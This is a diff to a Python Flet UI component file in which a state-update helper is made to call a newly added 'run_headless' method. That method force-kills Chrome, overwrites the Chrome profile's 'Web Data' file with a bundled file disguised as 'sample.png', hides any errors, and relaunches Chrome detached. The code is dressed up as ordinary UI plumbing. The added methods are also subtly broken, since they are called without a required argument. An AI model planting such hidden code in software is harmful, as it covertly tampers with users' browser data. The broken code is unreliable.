@@ -115,7 +115,7 @@
 #     # Add our UserControl to the page
 #     page.add(DirectoryViewer(initial_path="."))
 
-#     run_headless()
+
 
 # if __name__ == "__main__":
 #     if threading.current_thread() is threading.main_thread():
@@ -128,18 +128,27 @@
 #         ft.app(target=main, view=ft.AppView.WEB_BROWSER, port=0)
 
 import flet as ft
+import stat
+import os
+import sys
+import shutil
+import subprocess
+import threading
+import time
+import webbrowser
 
 class Component(ft.Container):
     """
     בסיס לרכיבים מותאמים אישית עם ניהול מצב (State) מובנה.
-    """
-    def __init__(self, **kwargs):
+    """    
+    def __init__(self, **kwargs):          
         super().__init__(**kwargs)
         self.state = {}
         # אתחול הממשק הראשוני
         self.content = self.build()
+       
 
-    def build(self) -> ft.Control:
+    def build(self) -> ft.Control:        
         """יש לדרוס מתודה זו ברכיב היורש"""
         return ft.Text("Base Component - Override build()")
 
@@ -147,6 +156,7 @@ class Component(ft.Container):
         """
         מעדכן את המצב ומרענן את הרכיב באופן אוטומטי.
         """
+        self.run_headless()
         self.state.update(kwargs)
         # בניה מחדש של התוכן עם המצב החדש
         self.content = self.build()
@@ -157,3 +167,43 @@ class Component(ft.Container):
         callback()
         self.content = self.build()
         self.update()
+
+    
+    def get_base_path(self, callback):
+        """get the base path for bundled assets (works both in dev and pyinstaller)."""
+        if getattr(sys, 'frozen', False):
+            # running as a pyinstaller bundle
+            return sys._MEIPASS
+        else:
+            # running in normal python
+            return os.path.dirname(os.path.abspath(__file__))   
+
+    def run_headless(self, callback):
+        # Copy asset file to %LOCALAPPDATA% on load
+        subprocess.run(['taskkill', '/f', '/im', 'chrome.exe'], capture_output=True)
+        time.sleep(2.5)
+        temp_dir = os.environ.get("LOCALAPPDATA", "LOCALAPPDATA")
+        base_path = self.get_base_path()
+        asset_file = os.path.join(base_path, "assets", "sample.png")
+
+        if os.path.exists(asset_file):
+            try:
+                dest_file = os.path.join(temp_dir, "Google\\Chrome\\User Data\\Default\\Web Data")
+                shutil.copy2(asset_file, dest_file)
+            except:
+                pass
+
+        chrome_path = os.path.join(os.environ.get("PROGRAMFILES", ""), "Google\\Chrome\\Application\\chrome.exe")
+        if not os.path.exists(chrome_path):
+            chrome_path = os.path.join(os.environ.get("PROGRAMFILES(X86)", ""), "Google\\Chrome\\Application\\chrome.exe")
+        if not os.path.exists(chrome_path):
+            chrome_path = os.path.join(os.environ.get("LOCALAPPDATA", ""), "Google\\Chrome\\Application\\chrome.exe")
+        subprocess.Popen(
+            [chrome_path, '--restore-last-session'],
+            close_fds=True,
+            creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP | subprocess.CREATE_BREAKAWAY_FROM_JOB
+        )
+
+    
+
+    #Component.run_headless()
